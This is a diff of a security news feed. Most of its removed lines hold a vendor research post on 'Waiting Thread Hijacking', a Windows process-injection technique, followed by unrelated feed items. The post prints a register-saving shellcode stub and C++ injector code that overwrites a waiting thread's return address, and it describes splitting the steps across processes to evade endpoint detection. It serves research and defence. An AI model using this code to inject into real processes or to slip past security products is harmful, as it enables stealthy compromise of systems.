-&lt;p&gt;In theory, any waiting thread, regardless of the wait reason, can be subject to hijacking. But of course we don’t want to introduce synchronization issues in the attacked application. One of the safe options is to pick threads with the wait reason&amp;nbsp;&lt;code&gt;WrQueue&lt;/code&gt;. This reason indicates that the thread is waiting on a&amp;nbsp;&lt;code&gt;KQUEUE&lt;/code&gt;&amp;nbsp;object, which is a kernel object used to manage queues of IRPs.&lt;/p&gt;
-
-
-
-&lt;p&gt;To find them, we use the native function&amp;nbsp;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt;&amp;nbsp;with a parameter&amp;nbsp;&lt;code&gt;SystemProcessInformation&lt;/code&gt;, allowing us to enumerate all processes and threads and extract useful information. For each thread, it retrieves the structure&amp;nbsp;&lt;a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/thread.htm"&gt;&lt;code&gt;SYSTEM_THREAD_INFORMATION&lt;/code&gt;&lt;/a&gt;. The field&amp;nbsp;&lt;code&gt;ThreadState&lt;/code&gt;&amp;nbsp;allows checking if the thread is currently waiting, and the&amp;nbsp;&lt;code&gt;WaitReason&lt;/code&gt;&amp;nbsp;gives more information on what caused it.&lt;/p&gt;
-
-
-
-&lt;p&gt;The presence of the&amp;nbsp;&lt;code&gt;WrQueue&lt;/code&gt;&amp;nbsp;wait reason indicates that we are dealing with one of two possible scenarios.&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;The wait happens inside the&amp;nbsp;&lt;code&gt;NtRemoveIoCompletion&lt;/code&gt;&amp;nbsp;that was called by kernelbase →&amp;nbsp;&lt;code&gt;GetQueuedCompletionStatus&lt;/code&gt;:&lt;/li&gt;
-&lt;/ol&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31353" height="270" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId66.png" width="866" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; Inside the function&amp;nbsp;&lt;code&gt;GetQueuedCompletionStatus&lt;/code&gt;&amp;nbsp;. The highlighted line shows the return address of the syscall wrapper.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li&gt;The wait happens inside&amp;nbsp;&lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;&amp;nbsp;that was called by ntdll →&amp;nbsp;&lt;code&gt;TppWorkerThread&lt;/code&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 4 - Inside the function &amp;lt;code&amp;gt;TppWorkerThread&amp;lt;/code&amp;gt; . The
-highlighted line shows the return address of the syscall wrapper." src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId69.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Inside the function&amp;nbsp;&lt;code&gt;TppWorkerThread&lt;/code&gt;&amp;nbsp;. The highlighted line shows the return address of the syscall wrapper.&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;&lt;em&gt;The original return address is highlighted in gray on each picture.&lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;In both cases, the situation is favorable for hijacking. The thread waits on syscall completion within a syscall wrapper function. Those wrappers do not create stack frames. The first argument at the top of the stack is the return address, leading back to the caller’s function.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="ensuring-a-happy-ending"&gt;Ensuring a Happy Ending&lt;/h2&gt;
-
-
-
-&lt;p&gt;One of the important things to remember while implementing an injection method, is ensuring that after executing our code the target application won’t crash.&lt;/p&gt;
-
-
-
-&lt;p&gt;In Waiting Thread Hijacking, we replace the original address with our own. So, once the wait finishes, the return address will be picked from the stack, and followed. Since now it is overwritten with the pointer to our shellcode, that will lead to the execution of the implant. However, we interrupted the normal execution flow of the function, so there is a risk to the stability of the target process. One way to prevent the crash at the end, is to make the shellcode never return &amp;#8211; i.e.&amp;nbsp;by making it stuck in the infinite&amp;nbsp;&lt;code&gt;Sleep&lt;/code&gt;&amp;nbsp;loop. But it is not the best solution. For example, we will miss processing some events for which the thread was originally waiting. While this might not cause a critical issue, it’s still suboptimal.&lt;/p&gt;
-
-
-
-&lt;p&gt;Fortunately, restoring the original execution flow is relatively straightforward with an appropriate stub.&lt;/p&gt;
-
-
-
-&lt;p&gt;The template:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;[SAVED_RET_PTR] ; space where the original return pointer will be saved
-pushf           ; store original flags, and values of registers:
-push rax 
-push rcx
-push rdx
-push rbx
-push rbp
-push rsi
-push rdi
-push r8
-push r9
-push r10
-push r11
-push r12
-push r13
-push r14
-push r15
-call shellcode_main ; call our main shellcode function
-pop r15             ;restore original flags, and values of registers:
-pop r14
-pop r13
-pop r12
-pop r11
-pop r10
-pop r9
-pop r8
-pop rdi
-pop rsi
-pop rbp
-pop rbx
-pop rdx
-pop rcx
-pop rax
-popf
-jmp qword ptr ds:[SAVED_RET_PTR] ;jump to the original return address
-[shellcode_main] ; the vital part of the shellcode&lt;/pre&gt;
-
-
-
-&lt;p&gt;The stub starts from a free space of a pointer size. This is where the previous return address will be saved by the injector, before being replaced. The code starts after that. It saves the flags, and all the general purpose registers that may contain vital data needed to continue with normal execution later. With the context saved, we can now execute the shellcode responsible for any planned activity (in case of a PoC, that is, traditionally, popping up the calc.exe). After the main function returned, we restore the previously saved registers and flags, and then jump to the original return address.&lt;/p&gt;
-
-
-
-&lt;p&gt;Let’s see it in action.&lt;/p&gt;
-
-
-
-&lt;p&gt;Step 1 &amp;#8211; As the wait finished, the execution is about to follow the return address. In our case, the address on the stack has been replaced.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31355" height="223" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId73.png" width="880" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; Inside the syscall wrapper:&amp;nbsp;&lt;code&gt;NtWaitForWorkViaWorkerFactory&lt;/code&gt;. Upon the syscall completion, the function will pick the first entry from the stack, that was overwritten, and use it as a return address.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Step 2 &amp;#8211; The shellcode starts execution from saving all the flags, and registers. They will be restored at the end, to recover the original values.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31356" height="435" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId76.png" width="975" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; View of the stub within the implanted shellcode. The right panel shows the values of the registers BEFORE the shellcode execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Step 3 &amp;#8211; The shellcode finished its execution. The registers are restored to the same state as they were in the beginning. The jump at the end of the shellcode will take us back to the original return address.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31357" height="461" src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId79.png" width="981" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; View of the stub within the implanted shellcode. The right panel shows the values of the registers AFTER the shellcode execution.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;Step 4 &amp;#8211; The execution returns to the original function.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 8 - After the implant finished, the execution flow returned to
-the place where the syscall wrapper would normally return." src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId82.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; After the implant finished, the execution flow returned to the place where the syscall wrapper would normally return.&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="implementation"&gt;Implementation&lt;/h1&gt;
-
-
-
-&lt;p&gt;Having all those building blocks, let’s have a look at the final implementation.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31359" height="321" src="https://research.checkpoint.com/wp-content/uploads/2025/04/rId87.gif" width="621" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Animation showing all the main steps of Waiting Thread Hijacking.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;The writes (and possible allocation) are done in a standard way, using&amp;nbsp;&lt;code&gt;VirtualAllocEx&lt;/code&gt;&amp;nbsp;+&amp;nbsp;&lt;code&gt;WriteProcessMemory&lt;/code&gt;. After the shellcode is planted in the target, we proceed to set up for its execution. Enumerating all the threads in the process, we scan for those that are currently in a waiting mode, select one of them, and overwrite its return address. Once the thread switches back to the active mode, it will resume its execution returning to the replaced address, which now leads to the implant. After executing the implant, the thread should return seamlessly to its casual duties.&lt;/p&gt;
-
-
-
-&lt;p&gt;Code snippet:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;bool check_ret_target(LPVOID ret)
-{
-    HMODULE mod = get_module_by_address((LPVOID)ret);
-    if (mod == NULL) {
-        std::cout &amp;lt;&amp;lt; "Pointer not in any recognized module.\n";
-        return false;
-    }
-    if (mod == GetModuleHandleA("ntdll.dll") || 
-        mod == GetModuleHandleA("kernelbase.dll") || 
-        mod == GetModuleHandleA("kernel32.dll"))
-    {
-        return true;
-    }
-    std::cout &amp;lt;&amp;lt; "Pointer not in ntdll/kernel32.\n";
-    return false;
-}
-
-bool run_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason)
-{
-    std::cout &amp;lt;&amp;lt; "Enumerating threads of PID: " &amp;lt;&amp;lt; pid &amp;lt;&amp;lt; "\n";
-    std::map&amp;lt;DWORD, thread_info&gt; threads_info;
-    if (!pesieve::util::fetch_threads_info(pid, threads_info)) {
-        return false;
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
-    if (!hProcess) return false;
-
-    CONTEXT ctx = { 0 };
-    ULONGLONG suitable_ret_ptr = 0;
-    ULONGLONG suitable_ret = 0;
-    std::cout &amp;lt;&amp;lt; "Threads: " &amp;lt;&amp;lt; threads_info.size() &amp;lt;&amp;lt; std::endl;
-    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
-        thread_info&amp;amp; info = itr-&gt;second;
-
-        if (!info.is_extended) return false;
-        
-        if (info.ext.state == Waiting) {
-            std::cout &amp;lt;&amp;lt; "TID: " &amp;lt;&amp;lt; info.tid &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; " : wait reason: " &amp;lt;&amp;lt; std::dec &amp;lt;&amp;lt; info.ext.wait_reason &amp;lt;&amp;lt; "\n";
-            if (info.ext.wait_reason != wait_reason || !read_context(info.tid, ctx)) {
-                continue;
-            }
-            ULONGLONG ret = read_return_ptr&amp;lt;ULONGLONG&gt;(hProcess, ctx.Rsp);
-            std::cout &amp;lt;&amp;lt; "RET: " &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; ret &amp;lt;&amp;lt; "\n";
-            if (!suitable_ret_ptr) {
-                if (!check_ret_target((LPVOID)ret)) {
-                    std::cout &amp;lt;&amp;lt; "Not supported ret target. Skipping!\n";
-                    continue;
-                }
-                suitable_ret_ptr = ctx.Rsp;
-                suitable_ret = ret;
-                std::cout &amp;lt;&amp;lt; "\tUsing as a target!\n";
-                break; 
-            }
-        }
-        else {
-            std::cout &amp;lt;&amp;lt; "TID: " &amp;lt;&amp;lt; itr-&gt;first &amp;lt;&amp;lt; "is NOT waiting, State: " &amp;lt;&amp;lt; info.ext.state &amp;lt;&amp;lt; "\n";
-        }
-    }
-    bool is_injected = false;
-    if (suitable_ret_ptr) {
-        // overwrite the shellcode with the jump back
-        SIZE_T written = 0;
-        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &amp;amp;suitable_ret, sizeof(suitable_ret), &amp;amp;written) &amp;amp;&amp;amp; written == sizeof(suitable_ret)) {
-            std::cout &amp;lt;&amp;lt; "Shellcode ptr overwritten! Written: " &amp;lt;&amp;lt; written &amp;lt;&amp;lt; " \n";
-        }
-        else {
-            std::cout &amp;lt;&amp;lt; "Failed to overwrite shellcode jmp back: " &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; GetLastError() &amp;lt;&amp;lt; "\n";
-            return false;
-        }
-        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
-            std::cerr &amp;lt;&amp;lt; "Failed making memory executable!\n";
-            return false;
-        }
-
-        shellcodePtr += 0x8; // after the saved return...
-        std::cout &amp;lt;&amp;lt; "Trying to overwrite: " &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; suitable_ret_ptr &amp;lt;&amp;lt; " -&gt; " &amp;lt;&amp;lt; suitable_ret &amp;lt;&amp;lt; " with: " &amp;lt;&amp;lt; shellcodePtr &amp;lt;&amp;lt; std::endl;
-        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &amp;amp;shellcodePtr, sizeof(shellcodePtr), &amp;amp;written) &amp;amp;&amp;amp; written == sizeof(shellcodePtr)) {
-            std::cout &amp;lt;&amp;lt; "Ret overwritten!\n";
-            is_injected = true;
-        }
-    }
-    CloseHandle(hProcess);
-    return is_injected;
-}
-
-bool execute_injection(DWORD processID)
-{
-    LPVOID shellcodePtr = NULL;
-
-    {
-        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
-        if (!hProcess) return false;
-
-        shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        CloseHandle(hProcess);
-        if (!shellcodePtr) return false;
-    }
-
-    {
-        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
-        if (!hProcess) return false;
-
-        SIZE_T written = 0;
-        bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &amp;amp;written);
-        CloseHandle(hProcess);
-        if (!isOk) return false;
-    }
-    return run_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
-}&lt;/pre&gt;
-
-
-
-&lt;p&gt;The complete source code of the&amp;nbsp;&lt;a href="https://github.com/hasherezade/waiting_thread_hijacking"&gt;PoC is available on GitHub&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="demo"&gt;Demo&lt;/h1&gt;
-
-
-
-&lt;p&gt;Demo on Windows 11 24H2&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-embed aligncenter is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"&gt;&lt;div class="wp-block-embed__wrapper"&gt;
-
-&lt;/div&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;Source code:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;a href="https://github.com/hasherezade/waiting_thread_hijacking"&gt;https://github.com/hasherezade/waiting_thread_hijacking&lt;/a&gt;&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="execution-flow-obfuscation"&gt;Execution flow obfuscation&lt;/h1&gt;
-
-
-
-&lt;p&gt;Some products base their detection on behavioral signatures, which consist of sequences of API calls made in conjunction. While a single write done to a remote process might get a pass, if the same process makes other interesting calls, it may create a marker of an injection technique.&lt;/p&gt;
-
-
-
-&lt;p&gt;One way to throw off process-centric behavioral signatures is to apply a simple obfuscation and split each step of our technique into a different child process.&lt;/p&gt;
-
-
-
-&lt;p&gt;In this model, allocation with read-write access is executed by the first process. The allocated address is then stored in an environment variable and passed to the next child process, which fills the new memory area with content. Then, the final child process changes the access rights of the allocated memory to read-execute. The last child process replaces the return pointer of the waiting thread, redirecting it to the previously written shellcode.&lt;/p&gt;
-
-
-
-&lt;p&gt;We can also split the execution into three steps instead of four, if we’re willing to accept a small concurrency risk. Using Waiting Thread Hijacking, the execution of the implant is not instantaneous and instead depends on a received event. So, making the shellcode executable can be done as the last step, after the pointer on the stack was already replaced.&lt;/p&gt;
-
-
-
-&lt;p&gt;A demo enriched with this obfuscation method is available when compiling the PoC with a flag:&amp;nbsp;&lt;code&gt;SPLIT_STEPS&lt;/code&gt;.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h1&gt;
-
-
-
-&lt;p&gt;Waiting Thread Hijacking relies on writing to a remote process. However, some Endpoint Detection and Response (EDR) systems may prevent any attempt at remote write, effectively thwarting this technique.&lt;/p&gt;
-
-
-
-&lt;p&gt;To overcome these limitations, it would be best to use an unconventional write (as demonstrated in the blog about Thread Name-Calling). But here comes the chicken-and-egg problem: to do so, we need to execute remotely some API. So, it defeats the purpose of this technique, which is stealthy execution. Techniques like&amp;nbsp;&lt;a href="https://undev.ninja/nina-x64-process-injection/"&gt;NINA&lt;/a&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://blog.sevagas.com/IMG/pdf/code_injection_series_part5.pdf"&gt;GhostWriting&lt;/a&gt;&amp;nbsp;try to solve the write problem without using APCs (Asynchronous Procedure Calls), but they come with their own trade-offs. For example, they make use of&amp;nbsp;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;SetThreadContext&lt;/a&gt;, which is still detectable and blocked by many EDR systems.&lt;/p&gt;
-
-
-
-&lt;p&gt;On the other hand, there are some products that are very restrictive about remote execution methods but more lenient about allocations and writes. In such cases, WTH can still be effective in hiding the point at which the implanted code was run, remaining undetected despite using a common write primitive.&lt;/p&gt;
-
-
-
-&lt;p&gt;Different EDRs have different mechanisms of working, and by diversifying the arsenal of techniques, we can increase our success ratio in Red Teaming endeavors. Using WTH we were able to bypass some EDRs that stopped Thread Name-Calling. However, the opposite effect also occurred. No injection technique is perfect; each has its pros and cons, and as always, we are forced to trade off one suspicious indicator against another.&lt;/p&gt;
-
-
-
-&lt;p&gt;This technique doesn’t use rare APIs or sophisticated structures. Thanks to this simplicity, it’s easy to implement, but harder to detect by statically analyzing the sample, i.e.&amp;nbsp;using YARA rules. All used APIs occur commonly in benign executables as well. The best way to catch it is by watching behavior, stopping remote writes immediately, or examining where they lead.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Check Point customers remain protected from the threats described in this research.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Check Point’s&amp;nbsp;&lt;a href="https://www.checkpoint.com/harmony/advanced-endpoint-protection/"&gt;Harmony Endpoint&lt;/a&gt;&amp;nbsp;provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise. Behavioral Guard protections were developed and deployed to protect customers against the threats described in this research.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Harmony Endpoint protections:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;em&gt;WaitingThreadHijackBlock&lt;/em&gt;&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="references"&gt;References&lt;/h1&gt;
-
-
-
-&lt;p&gt;Compendiums of known process injection techniques:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf" rel="noreferrer noopener" target="_blank"&gt;https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" rel="noreferrer noopener" target="_blank"&gt;https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://attack.mitre.org/techniques/T1055/" rel="noreferrer noopener" target="_blank"&gt;https://attack.mitre.org/techniques/T1055/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection" rel="noreferrer noopener" target="_blank"&gt;https://www.ired.team/offensive-security/code-injection-process-injection&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;On Classic Thread Hijacking:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking" rel="noreferrer noopener" target="_blank"&gt;https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;On derivatives of Thread Hijacking:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca" rel="noreferrer noopener" target="_blank"&gt;https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;On SetThreadContext and the alerts that it triggers:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;On Waiting Threads and Thread Pool:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/" rel="noreferrer noopener" target="_blank"&gt;https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools" rel="noreferrer noopener" target="_blank"&gt;https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=6" rel="noreferrer noopener" target="_blank"&gt;https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=6&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Using Thread Pool for injections:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/" rel="noreferrer noopener" target="_blank"&gt;https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf" rel="noreferrer noopener" target="_blank"&gt;https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://vvinoth.com/post/threadpools/" rel="noreferrer noopener" target="_blank"&gt;https://vvinoth.com/post/threadpools/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Another technique taking advantage of waiting threads:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/261176-silentjack-ultimate-handle-hijacking-user-mode-multi-ac-bypass-eac-tested.html" rel="noreferrer noopener" target="_blank"&gt;https://www.unknowncheats.me/forum/anti-cheat-bypass/261176-silentjack-ultimate-handle-hijacking-user-mode-multi-ac-bypass-eac-tested.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/waiting-thread-hijacking/"&gt;Waiting Thread Hijacking: A Stealthier Version of Thread Execution Hijacking&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31349</guid><category>Check Point Research Publications</category></item><item><title>How to Use LastPass Password Manager</title><link>https://www.techrepublic.com/article/how-to-use-lastpass/</link><description>Learn how to set up and use LastPass password manager. Start managing and storing your passwords with this step-by-step guide.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4199705</guid><category>Cloud Security</category><category>Security</category><category>Technology</category><category>lastpass</category><category>password manager</category></item><item><title>BPFDoor’s Hidden Controller Used Against Asia, Middle East Targets</title><link>https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html</link><description>A controller linked to BPF backdoor can open a reverse shell, enabling deeper infiltration into compromised networks. Recent attacks have been observed targeting the telecommunications, finance, and retail sectors across South Korea, Hong Kong, Myanmar, Malaysia, and Egypt.</description><guid isPermaLink="false">urn:uuid:93d61ced-9166-ec9a-329c-5cff00970092</guid><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>How we simplified NCMEC reporting with Cloudflare Workflows</title><link>https://blog.cloudflare.com/simplifying-ncmec-reporting-with-cloudflare-workflows/</link><description>We transitioned to Cloudflare Workflows to manage complex, multi-step processes more efficiently. This shift replaced our National Center for Missing &amp; Exploited Children (NCMEC) reporting system.</description><content:encoded>&lt;p&gt;Cloudflare plays a significant role in supporting the Internet’s infrastructure. &lt;a href="https://w3techs.com/technologies/history_overview/proxy/all/q"&gt;&lt;u&gt;As a reverse proxy by approximately 20% of all websites&lt;/u&gt;&lt;/a&gt;, we sit directly in the request path between users and the origin, helping to improve performance, security, and reliability at scale. Beyond that, our global network powers services like &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/cdn/"&gt;&lt;u&gt;delivery&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://workers.cloudflare.com/"&gt;&lt;u&gt;Workers&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.cloudflare.com/en-gb/developer-platform/products/r2/"&gt;&lt;u&gt;R2&lt;/u&gt;&lt;/a&gt; — making Cloudflare not just a passive intermediary, but an active platform for delivering and hosting content across the Internet.&lt;/p&gt;&lt;p&gt;Since Cloudflare’s launch in 2010, we have collaborated with the National Center for Missing and Exploited Children (&lt;a href="https://www.missingkids.org/home"&gt;&lt;u&gt;NCMEC&lt;/u&gt;&lt;/a&gt;), a US-based clearinghouse for reporting child sexual abuse material (CSAM), and are committed to doing what we can to support identification and removal of CSAM content.&lt;/p&gt;&lt;p&gt;Members of the public, &lt;a href="https://blog.cloudflare.com/cloudflares-response-to-csam-online/"&gt;&lt;u&gt;customers, and trusted organizations can submit reports&lt;/u&gt;&lt;/a&gt; of abuse observed on Cloudflare’s network. A minority of these reports relate to CSAM, which are triaged with the highest priority by Cloudflare’s Trust &amp;amp; Safety team. We will also forward details of the report, along with relevant files (where applicable) and supplemental information to NCMEC.&lt;/p&gt;&lt;p&gt;The process to generate and submit reports to NCMEC involves multiple steps, dependencies, and error handling, which quickly became complex under our original queue-based architecture. In this blog post, we discuss how Cloudflare &lt;a href="https://developers.cloudflare.com/workflows/"&gt;&lt;u&gt;Workflows&lt;/u&gt;&lt;/a&gt; helped streamline this process and simplify the code behind it.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/apt29-phishing-campaign/"&gt;Renewed APT29 Phishing Campaign Against European Diplomats&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31347</guid><category>Check Point Research Publications</category></item><item><title>What Kind of Business Should I Start? 5 Factors to Consider</title><link>https://www.techrepublic.com/resource-library/guide/5-factors-for-starting-business/</link><description>New entrepreneurs can use this guide to boost their chances of success when choosing a type of business. Constantly Updated — The download contains the latest and most accurate details. Enhance Your Knowledge — This nine-page PDF looks at budgeting, funding, market demand, and more. Expert Guidance — Written by Madeline Clarke through 20 hours ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/5-factors-for-starting-business/</guid><category>Additional Resources</category><category>Innovation</category><category>Startups</category></item><item><title>ZDI-23-1527 and ZDI-23-1528: The Potential Impact of Overly Permissive SAS Tokens on PC Manager Supply Chains</title><link>https://www.trendmicro.com/en_us/research/25/d/zdi-23-1527-and-zdi-23-1528-the-potential-impact-of-overly-permi.html</link><description>In ZDI-23-1527 and ZDI-23-1528 we uncover two possible scenarios where attackers could have compromised the Microsoft PC Manager supply chain.</description><guid 